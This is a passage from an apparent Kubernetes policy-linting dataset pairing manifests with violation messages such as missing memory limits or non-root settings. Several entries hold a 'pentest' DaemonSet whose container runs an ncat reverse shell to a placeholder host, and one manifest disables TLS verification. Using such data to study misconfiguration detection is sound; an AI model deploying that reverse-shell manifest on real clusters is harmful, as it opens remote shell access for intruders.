IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"provisioner-kube-rbac-proxy\" has memory limit 0"
  },
  {
    "id": "9000",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"resizer-kube-rbac-proxy\" has memory limit 0"
  },
  {
    "id": "9001",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vsphere-syncer\" has memory limit 0"
  },
  {
    "id": "9002",
    "manifest_path": "data/manifests/the_stack_sample/sample_3390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpid-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostpid-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "9003",
    "manifest_path": "data/manifests/the_stack_sample/sample_3390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpid-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostpid-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hostpid-revshell-daemonset\" is using an invalid container image, \"raesene/ncat\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9004",
    "manifest_path": "data/manifests/the_stack_sample/sample_3390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpid-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostpid-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hostpid-revshell-daemonset\" does not have a read-only root file system"
  },
  {
    "id": "9005",
    "manifest_path": "data/manifests/the_stack_sample/sample_3390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpid-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostpid-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hostpid-revshell-daemonset\" is not set to runAsNonRoot"
  },
  {
    "id": "9006",
    "manifest_path": "data/manifests/the_stack_sample/sample_3390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpid-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostpid-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hostpid-revshell-daemonset\" has cpu request 0"
  },
  {
    "id": "9007",
    "manifest_path": "data/manifests/the_stack_sample/sample_3390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostpid-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostpid-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hostpid-revshell-daemonset\" has memory limit 0"
  },
  {
    "id": "9008",
    "manifest_path": "data/manifests/the_stack_sample/sample_3391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: po17-vol\nspec:\n  volumes:\n  - name: vol17\n    configMap:\n      name: cm17\n  containers:\n  - name: ctr17\n    image: httpd\n    volumeMounts:\n    - name: vol17\n      mountPath: /tmp/apache/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ctr17\" is using an invalid container image, \"httpd\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9009",
    "manifest_path": "data/manifests/the_stack_sample/sample_3391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: po17-vol\nspec:\n  volumes:\n  - name: vol17\n    configMap:\n      name: cm17\n  containers:\n  - name: ctr17\n    image: httpd\n    volumeMounts:\n    - name: vol17\n      mountPath: /tmp/apache/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ctr17\" does not have a read-only root file system"
  },
  {
    "id": "9010",
    "manifest_path": "data/manifests/the_stack_sample/sample_3391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: po17-vol\nspec:\n  volumes:\n  - name: vol17\n    configMap:\n      name: cm17\n  containers:\n  - name: ctr17\n    image: httpd\n    volumeMounts:\n    - name: vol17\n      mountPath: /tmp/apache/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ctr17\" is not set to runAsNonRoot"
  },
  {
    "id": "9011",
    "manifest_path": "data/manifests/the_stack_sample/sample_3391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: po17-vol\nspec:\n  volumes:\n  - name: vol17\n    configMap:\n      name: cm17\n  containers:\n  - name: ctr17\n    image: httpd\n    volumeMounts:\n    - name: vol17\n      mountPath: /tmp/apache/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ctr17\" has cpu request 0"
  },
  {
    "id": "9012",
    "manifest_path": "data/manifests/the_stack_sample/sample_3391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: po17-vol\nspec:\n  volumes:\n  - name: vol17\n    configMap:\n      name: cm17\n  containers:\n  - name: ctr17\n    image: httpd\n    volumeMounts:\n    - name: vol17\n      mountPath: /tmp/apache/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ctr17\" has memory limit 0"
  },
  {
    "id": "9013",
    "manifest_path": "data/manifests/the_stack_sample/sample_3392.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: grafana\n  namespace: observatorium\n  annotations:\n    prometheus.io/scrape: 'true'\n    prometheus.io/port: '3000'\nspec:\n  selector:\n    app: grafana\n  type: NodePort\n  ports:\n  - port: 3000\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:grafana])"
  },
  {
    "id": "9014",
    "manifest_path": "data/manifests/the_stack_sample/sample_3393.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: write-handler\n  name: write-handler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: write-handler\n  template:\n    metadata:\n      labels:\n        app: write-handler\n    spec:\n      containers:\n      - env:\n        - name: CONFIG\n          value: /oada.config.js\n        - name: DEBUG\n          value: '*:error,*:warn,*:info'\n        - name: DOMAIN\n          value: localhost\n        - name: NODE_ENV\n          value: production\n        - name: NODE_TLS_REJECT_UNAUTHORIZED\n          value: '0'\n        - name: PINO_TRANSPORT\n          value: yarn g:pretty -clti pid,hostname\n        image: oada/write-handler:edge\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1000\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        name: write-handler\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp\n      volumes:\n      - name: tmp\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"write-handler\" has cpu request 0"
  },
  {
    "id": "9015",
    "manifest_path": "data/manifests/the_stack_sample/sample_3393.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: write-handler\n  name: write-handler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: write-handler\n  template:\n    metadata:\n      labels:\n        app: write-handler\n    spec:\n      containers:\n      - env:\n        - name: CONFIG\n          value: /oada.config.js\n        - name: DEBUG\n          value: '*:error,*:warn,*:info'\n        - name: DOMAIN\n          value: localhost\n        - name: NODE_ENV\n          value: production\n        - name: NODE_TLS_REJECT_UNAUTHORIZED\n          value: '0'\n        - name: PINO_TRANSPORT\n          value: yarn g:pretty -clti pid,hostname\n        image: oada/write-handler:edge\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1000\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        name: write-handler\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp\n      volumes:\n      - name: tmp\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"write-handler\" has memory limit 0"
  },
  {
    "id": "9016",
    "manifest_path": "data/manifests/the_stack_sample/sample_3394.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20191211-cf6fb4d2b\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "9017",
    "manifest_path": "data/manifests/the_stack_sample/sample_3394.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20191211-cf6fb4d2b\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "9018",
    "manifest_path": "data/manifests/the_stack_sample/sample_3394.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20191211-cf6fb4d2b\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "9019",
    "manifest_path": "data/manifests/the_stack_sample/sample_3394.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20191211-cf6fb4d2b\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "9020",
    "manifest_path": "data/manifests/the_stack_sample/sample_3395.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: run-job\n          image: node:lts-jessie\n          command:\n          - node\n          - \"\\u201Cjob.js\\u201D\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"run-job\" does not have a read-only root file system"
  },
  {
